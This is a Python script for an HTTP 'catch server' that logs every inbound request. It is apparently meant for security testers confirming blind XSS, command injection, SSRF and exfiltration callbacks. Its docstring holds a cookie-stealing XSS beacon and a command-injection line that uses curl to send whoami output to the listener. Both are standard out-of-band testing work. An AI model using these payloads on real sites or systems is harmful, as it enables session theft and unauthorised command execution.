#!/usr/bin/env python3
"""catch-server — log every inbound HTTP request to this box.

Use it to prove out-of-band bugs: blind XSS callbacks, command-injection OAST
pings, SSRF fetches, data exfil. Anything that hits any path is printed with a
timestamp, source IP, method, full path (your exfil rides here), headers, and body.

Usage:
    python3 catch-server.py [port] [--bind IP]

Examples:
    python3 catch-server.py 9001
    python3 catch-server.py 9001 --bind 10.10.14.5

Then point a payload at it, e.g.:
    <script>new Image().src='http://<you>:9001/c?'+document.cookie</script>
    ; curl http://<you>:9001/cmdi-$(whoami)
"""
import sys
import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import unquote


class Catch(BaseHTTPRequestHandler):
    def _log(self):
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length).decode("latin-1") if length else ""
        print("\n" + "=" * 60)
        print(f"[{ts}] {self.client_address[0]} -> {self.command} {unquote(self.path)}")
        for k, v in self.headers.items():
            print(f"    {k}: {v}")
        if body:
            print("    --- body ---")
            print("    " + body.replace("\n", "\n    "))
        sys.stdout.flush()
        # Always answer 200 with a 1x1 gif so <img> payloads fire cleanly.
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.end_headers()
        self.wfile.write(
            b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!"
            b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
        )

    do_GET = do_POST = do_PUT = do_HEAD = _log

    def log_message(self, *a):
        pass  # we print our own


def main():
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    port = int(args[0]) if args else 9001
    bind = "0.0.0.0"
    if "--bind" in sys.argv:
        bind = sys.argv[sys.argv.index("--bind") + 1]
    srv = ThreadingHTTPServer((bind, port), Catch)
    print(f"[*] catch-server listening on {bind}:{port}  (Ctrl-C to stop)")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] bye")


if __name__ == "__main__":
    main()
